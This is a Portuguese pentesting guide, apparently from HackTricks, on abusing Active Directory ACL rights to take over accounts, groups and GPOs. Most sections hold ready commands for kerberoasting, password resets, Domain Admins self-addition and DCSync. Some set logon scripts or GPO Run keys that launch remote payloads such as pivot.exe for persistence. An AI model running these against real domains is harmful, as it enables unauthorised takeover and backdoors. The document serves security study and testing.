# Abusando das ACLs/ACEs do Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, consulte os artigos originais.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Direitos sobre Usuário**

Este privilégio concede a um atacante controle total sobre uma conta de usuário alvo. Uma vez que os direitos `GenericAll` sejam confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a Senha do Alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable; em seguida use Rubeus e targetedKerberoast.py para extrair e tentar crackar os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desative a pre-authentication do usuário, tornando sua conta vulnerável ao ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Direitos GenericAll em um Grupo**

Esse privilégio permite que um atacante manipule os membros de um grupo se ele tiver direitos `GenericAll` em um grupo como `Domain Admins`. Depois de identificar o nome distinto do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar-se ao grupo Domain Admins**: Isso pode ser feito via comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- A partir de Linux você também pode usar BloodyAD para se adicionar a grupos arbitrários quando tiver GenericAll/Write membership sobre eles. Se o grupo alvo estiver aninhado em “Remote Management Users”, você ganhará imediatamente acesso WinRM em hosts que respeitam esse grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Use esta técnica para se passar por um computador ou conta de usuário explorando os privilégios para criar shadow credentials.

## **WriteProperty on Group**

Se um usuário tiver direitos de `WriteProperty` sobre todos os objetos de um grupo específico (por exemplo, `Domain Admins`), eles podem:

- **Add Themselves to the Domain Admins Group**: Alcançável combinando os comandos `net user` e `Add-NetGroupUser`, este método permite escalada de privilégios dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Esse privilégio permite que atacantes se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação de membros ao grupo. A seguinte sequência de comandos permite a auto-adição:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Um privilégio semelhante, este permite que atacantes se adicionem diretamente a grupos ao modificar as propriedades do grupo se tiverem o direito `WriteProperty` nesses grupos. A confirmação e a execução deste privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Ter o `ExtendedRight` sobre um usuário para `User-Force-Change-Password` permite redefinir a senha sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser feitas via PowerShell ou ferramentas de linha de comando alternativas, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e comandos de uma linha para ambientes não interativos. Os comandos variam desde invocações simples do PowerShell até o uso de `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em Grupo**

Se um atacante descobrir que possui direitos `WriteOwner` sobre um grupo, ele pode alterar a propriedade do grupo para si mesmo. Isso é particularmente impactante quando o grupo em questão é `Domain Admins`, pois alterar o proprietário permite maior controle sobre os atributos e a associação do grupo. O processo envolve identificar o objeto correto via `Get-ObjectAcl` e então usar `Set-DomainObjectOwner` para modificar o proprietário, seja por SID ou por nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Esta permissão permite que um atacante modifique propriedades de usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o logon script path de um usuário para executar um script malicioso quando o usuário fizer logon. Isso é conseguido usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Com esse privilégio, atacantes podem manipular a associação a grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações de associação com comandos PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possuir um objeto do AD e ter privilégios `WriteDACL` sobre ele permite que um atacante se conceda privilégios `GenericAll` sobre o objeto. Isso é realizado por meio da manipulação ADSI, permitindo controle total sobre o objeto e a capacidade de modificar sua filiação a grupos. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicação no Domínio (DCSync)**

O ataque DCSync aproveita permissões de replicação específicas no domínio para se passar por um Domain Controller e sincronizar dados, incluindo credenciais de usuário. Esta técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Domain Controller. [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode representar riscos significativos de segurança. Por exemplo, se um usuário como `offense\spotless` tiver direitos delegados de gerenciamento de GPO, ele pode possuir privilégios como **WriteProperty**, **WriteDacl**, e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, como identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar Permissões de GPO

Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir quais GPOs um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores com uma Política Aplicada**: É possível resolver quais computadores uma GPO específica se aplica, ajudando a entender o escopo do impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas Aplicadas a um Computador**: Para ver quais políticas são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Política Aplicada**: Identificar unidades organizacionais (OUs) afetadas por uma determinada política pode ser feito usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abuso de GPO - New-GPOImmediateTask

GPOs mal configuradas podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser usado para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente os privilégios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O GroupPolicy module, se instalado, permite criar e vincular novos GPOs, além de definir preferências, como valores do registro, para executar backdoors em computadores afetados. Este método requer que o GPO seja atualizado e que um usuário faça logon no computador para a execução:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes, adicionando tarefas ou modificando configurações sem a necessidade de criar novos GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novos antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Políticas

As atualizações de GPO normalmente ocorrem a cada ~90 minutos. Para acelerar esse processo, especialmente após aplicar uma alteração, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata das políticas. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem aguardar o próximo ciclo automático de atualização.

### Por Trás dos Bastidores

Ao inspecionar as Scheduled Tasks de uma GPO específica, como a `Misconfigured Policy`, é possível confirmar a adição de tarefas como `evilTask`. Essas tarefas são criadas por scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, conforme mostrada no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve os detalhes da scheduled task — incluindo o comando a ser executado e seus triggers. Esse arquivo representa como as scheduled tasks são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação de políticas.

### Usuários e Grupos

As GPOs também permitem a manipulação de usuários e membros de grupos em sistemas alvo. Editando diretamente os arquivos de policy de Users and Groups, atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de policy para incluir novos usuários ou alterar associações de grupos.

O arquivo de configuração XML para Users and Groups descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados nos sistemas afetados. Esse método oferece uma abordagem direta para escalada de privilégios através da manipulação de GPOs.

Além disso, métodos adicionais para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via .msi files ou editar configurações de serviços, também podem ser considerados. Essas técnicas fornecem várias vias para manter acesso e controlar sistemas alvo por meio do abuso de GPOs.

## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
